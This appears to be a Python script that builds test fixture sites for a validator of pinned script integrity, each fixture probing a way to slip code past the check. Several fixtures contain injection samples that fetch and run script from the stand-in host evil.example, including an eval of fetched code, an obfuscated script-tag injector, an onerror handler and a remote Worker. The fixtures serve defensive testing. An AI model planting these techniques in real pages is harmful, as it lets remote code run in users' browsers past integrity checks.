import json, hashlib, os, sys
R='../repo'
m=json.load(open(R+'/shell/v1.2.6/SHELL.json'))
I=m['files']['factory.js']['integrity']
URL='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory/'.rstrip('/')+'@'+'0'*40+'/shell/v1.2.6/factory.js'
PIN='<script src="%s" integrity="%s" crossorigin="anonymous"></script>'%(URL,I)
def mk(name, html, files=None, mods=None, extra=None):
    os.makedirs(name, exist_ok=True)
    files=files or {}
    for k,v in files.items():
        p=os.path.join(name,k); os.makedirs(os.path.dirname(p) or name, exist_ok=True); open(p,'w').write(v)
    sh={'base':'v1.2.6','fork':False,'overrides':{}}
    if mods:
        sh['overrides']['modules']=[{'file':f,'sha256':hashlib.sha256(open(os.path.join(name,f),'rb').read()).hexdigest(),'hooks':['__subxPlugins'],'load':'before','reason':'t'} for f in mods]
    if extra: extra(sh)
    json.dump({'siteId':name,'shell':sh},open(name+'/site.json','w'))
    open(name+'/index.html','w').write('<html><head>%s</head><body></body></html>'%html)
MOD="(window.__subxPlugins=window.__subxPlugins||[]).push(function(c){return {};});\n"
# 0 control: valid room
mk('h0_control','<script src="ext/room.js"></script>'+PIN,{'ext/room.js':MOD},['ext/room.js'])
# 1 uppercase
mk('h1_upper','<SCRIPT SRC="app.js"></SCRIPT>'+PIN.replace('<script','<SCRIPT').replace(' src=',' SRC='),{'app.js':'x'})
# 2 data: and blob:
mk('h2_data','<script src="data:text/javascript,alert(1)"></script><script src="blob:https://x/1"></script>'+PIN)
# 3 srcdoc iframe
mk('h3_srcdoc','<iframe srcdoc="&lt;script src=&quot;https://evil.example/x.js&quot;&gt;&lt;/script&gt;"></iframe>'+PIN)
# 4 base href retarget of a declared module
mk('h4_base','<base href="https://evil.example/">'+'<script src="ext/room.js"></script>'+PIN,{'ext/room.js':MOD},['ext/room.js'])
# 5a static module import inside declared module file
mk('h5_modimport','<script type="module" src="ext/room.js"></script>'+PIN,{'ext/room.js':"import 'https://evil.example/x.js';\n"+MOD},['ext/room.js'])
# 5b undeclared inline module import
mk('h5b_inlinemod','<script type="module">import "https://evil.example/x.js"</script>'+PIN)
# 6 extra undeclared script before the pin
mk('h6_extrabefore','<script src="pre.js"></script>'+PIN,{'pre.js':'window.x=1'})
# 7 event handler attribute injection
mk('h7_onerror','<img src="x" onerror="var s=document.createElement(\'script\');s.src=\'https://evil.example/x.js\';document.head.appendChild(s)">'+PIN)
# 8 pin neutralized by type=text/plain (no shell runs) + nothing else
mk('h8_inertpin',PIN.replace('<script ','<script type="text/plain" '))
# 9 pin inside <template> (inert) 
mk('h9_templatepin','<template>'+PIN+'</template>')
# 10 declared module with eval/fetch (no createElement)
mk('h10_evalfetch','<script src="ext/room.js"></script>'+PIN,{'ext/room.js':"fetch('https://evil.example/x.js').then(r=>r.text()).then(eval);\n"+MOD},['ext/room.js'])
# 11 obfuscated createElement in declared module
mk('h11_obf','<script src="ext/room.js"></script>'+PIN,{'ext/room.js':"var t='scr'+'ipt';var s=document.createElement(t);s.src='https://evil.example/x.js';document.head.appendChild(s);\n"+MOD},['ext/room.js'])
# 12 javascript: URL in link / iframe src to remote page
mk('h12_iframe','<iframe src="https://evil.example/page.html"></iframe><a href="javascript:void(0)">x</a>'+PIN)
# 13 Worker from declared module
mk('h13_worker','<script src="ext/room.js"></script>'+PIN,{'ext/room.js':"new Worker('https://evil.example/w.js');\n"+MOD},['ext/room.js'])
# 14 pin with nomodule (skipped in modern browsers)
mk('h14_nomodule',PIN.replace('<script ','<script nomodule '))
# 15 local .shtml / .php page not scanned
mk('h15_php',PIN,{'page.php':'<script src="factory-copy.js"></script>'})
